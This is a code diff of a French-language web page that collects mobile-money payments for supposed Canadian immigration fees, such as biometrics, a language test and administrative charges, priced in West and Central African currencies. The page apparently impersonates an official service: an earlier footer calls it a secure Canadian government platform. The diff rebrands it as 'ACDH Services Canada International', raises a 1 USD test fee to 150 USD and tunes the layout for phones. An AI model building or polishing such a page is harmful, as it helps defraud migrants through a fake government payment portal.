@@ -2,7 +2,8 @@
 <html lang="fr">
 <head>
 <meta charset="UTF-8">
-<title>Service Immigration Paiement</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Paiement ACDH</title>
 
 <style>
 body {
@@ -14,40 +15,43 @@ body {
   display:flex;
   justify-content:center;
   align-items:center;
-  height:100vh;
+  min-height:100vh;
   margin:0;
 }
 
 .box {
   background:white;
-  padding:30px;
+  padding:25px;
   border-radius:12px;
-  width:360px;
+  width:90%;
+  max-width:380px;
   text-align:center;
-  animation: fadeIn 0.5s ease;
+  animation:fadeIn 0.5s ease;
 }
 
 @keyframes fadeIn {
   from {opacity:0; transform:translateY(20px);}
-  to {opacity:1; transform:translateY(0);}
+  to {opacity:1;}
 }
 
 .logo {
-  width:120px;
+  width:100px;
   margin-bottom:10px;
 }
 
 .title {
   font-weight:bold;
+  font-size:18px;
   margin-bottom:15px;
 }
 
 input, select {
   width:100%;
-  padding:10px;
+  padding:12px;
   margin-top:10px;
   border-radius:6px;
   border:1px solid #ccc;
+  font-size:16px;
 }
 
 .row {
@@ -56,24 +60,23 @@ input, select {
 }
 
 .prefix {
-  width:30%;
+  width:35%;
   background:#eee;
 }
 
 .phone {
-  width:70%;
+  width:65%;
 }
 
 button {
   width:100%;
-  padding:12px;
+  padding:14px;
   margin-top:15px;
   background:#00bcd4;
   color:white;
   border:none;
   border-radius:6px;
   font-weight:bold;
-  cursor:pointer;
 }
 
 button:hover {
@@ -83,6 +86,7 @@ button:hover {
 .amount-box {
   margin-top:10px;
   font-weight:bold;
+  font-size:16px;
 }
 
 #result {
@@ -91,12 +95,12 @@ button:hover {
 }
 
 .footer {
-  position:absolute;
+  position:fixed;
   bottom:10px;
-  color:white;
-  font-size:12px;
   width:100%;
   text-align:center;
+  color:white;
+  font-size:12px;
 }
 </style>
 </head>
@@ -110,7 +114,7 @@ button:hover {
 <div class="title">Service Immigration Paiement</div>
 
 <select id="service" onchange="updateAmount()">
-  <option value="1">Données biométriques - 1 USD</option>
+  <option value="150">Données biométriques - 150 USD</option>
   <option value="150">Test de langue - 150 USD</option>
   <option value="220">Droit administratif - 220 USD</option>
   <option value="520">Tout payer - 520 USD</option>
@@ -147,12 +151,11 @@ button:hover {
 </div>
 
 <div class="footer">
-© 2026 Services d'immigration Canada - Plateforme gouvernementale sécurisée. 🔒
+© 2026 ACDH Services Canada International — Plateforme sécurisée 🔒
 </div>
 
 <script>
 
-// taux approximatifs
 const rates = { XOF:600, XAF:600, CDF:2500 };
 
 const currencies = {
@@ -194,6 +197,7 @@ function toggleCurrency(){
 function updateAmount(){
 
   const usd = parseInt(service.value);
+
   let cur = (country.value==="COD") ? currency.value : currencies[country.value];
 
   let amount = (cur==="USD") ? usd : usd * rates[cur];
@@ -202,8 +206,7 @@ function updateAmount(){
 }
 
 function validatePhone(){
-  const num = phone.value.trim();
-  return /^[0-9]{7,10}$/.test(num);
+  return /^[0-9]{7,10}$/.test(phone.value.trim());
 }
 
 async function payer(){
@@ -231,13 +234,12 @@ async function payer(){
   const data = await res.json();
 
   result.innerText =
-    data.status==="ACCEPTED"?"📲 Vérifiez votre téléphone pour confirmé":
+    data.status==="ACCEPTED"?"📲 Vérifiez votre téléphone":
     data.status==="PENDING"?"⏳ En attente":
     data.status==="SUCCESS"?"✅ Paiement confirmé":
     "❌ Échec";
 }
 
-// init
 updateOperators();
 updateAmount();
 toggleCurrency();
